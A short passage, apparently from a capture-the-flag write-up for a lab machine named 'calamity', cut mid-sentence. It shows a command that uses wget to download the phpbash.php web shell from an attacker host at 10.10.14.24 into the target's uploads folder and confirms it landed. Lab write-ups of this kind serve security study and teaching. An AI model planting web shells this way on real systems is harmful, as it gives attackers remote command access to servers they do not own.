@@ -1,0 +1,1 @@
+the webroot, but I can write to the /uploads folder: calamity> wget 10.10.14.24/phpbash.php -O uploads/df.php calamity> ls uploads df.php It works: Or, I could skip getting a
